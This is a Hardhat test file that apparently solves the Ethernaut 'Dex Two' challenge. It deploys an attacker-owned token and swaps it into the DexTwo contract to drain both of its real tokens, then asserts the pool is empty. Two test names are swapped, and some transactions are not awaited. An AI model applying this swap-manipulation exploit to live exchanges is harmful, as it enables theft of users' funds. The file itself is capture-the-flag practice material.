import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/dist/src/signers";
import chai, { expect } from "chai";
import { solidity } from "ethereum-waffle";
import { deployments, ethers, getNamedAccounts } from "hardhat";

import { DexTwo, HackerToken, IERC20 } from "../typechain";

chai.use(solidity);

describe("Destroy Dex", () => {
  let deployer: SignerWithAddress;
  let hacker: SignerWithAddress;
  let dex: DexTwo;
  let tokenA: IERC20;
  let tokenB: IERC20;

  let hackerToken: HackerToken;

  before(async () => {
    deployer = await ethers.getSigner((await getNamedAccounts()).deployer);
    hacker = await ethers.getSigner((await getNamedAccounts()).hacker);
    await deployments.fixture(["DexTwo"]);

    dex = await ethers.getContract("DexTwo");
    tokenA = await ethers.getContractAt("IERC20", await dex.token1());
    tokenB = await ethers.getContractAt("IERC20", await dex.token2());
  });

  it("verify game state", async () => {
    expect(await tokenA.balanceOf(dex.address)).to.be.equal(100);
    expect(await tokenA.balanceOf(hacker.address)).to.be.equal(10);
    expect(await tokenB.balanceOf(dex.address)).to.be.equal(100);
    expect(await tokenB.balanceOf(hacker.address)).to.be.equal(10);
    expect(
      await dex.getSwapAmount(tokenA.address, tokenB.address, 1)
    ).to.be.equal(1);
  });

  it("deploy HackerToken", async () => {
    await deployments.deploy("HackerToken", {
      from: hacker.address,
      args: [400],
      log: true,
    });
    hackerToken = await ethers.getContract("HackerToken");
  });

  it("addLiquidity as HackerToken", async () => {
    hackerToken.connect(hacker).approve(dex.address, 100);
    dex.connect(hacker).addLiquidity(hackerToken.address, 100);
  });

  it("should drain TokenA out", async () => {
    hackerToken.connect(hacker).approve(dex.address, 100);
    dex.connect(hacker).swap(hackerToken.address, tokenB.address, 100);
    expect(await tokenB.balanceOf(hacker.address)).to.be.equal(110);
  });

  it("should drain TokenB out", async () => {
    // Dex now has 200 HackerToken, price is 200 HTK:100 TKNB
    const balance = await hackerToken.balanceOf(dex.address);
    expect(balance).to.be.equal(200);
    hackerToken.connect(hacker).approve(dex.address, balance);
    dex.connect(hacker).swap(hackerToken.address, tokenA.address, balance);
    expect(await tokenA.balanceOf(hacker.address)).to.be.equal(110);
  });

  it("DexTwo has been destroyed", async () => {
    expect(await tokenA.balanceOf(dex.address)).to.be.equal(0);
    expect(await tokenB.balanceOf(dex.address)).to.be.equal(0);
  });
});
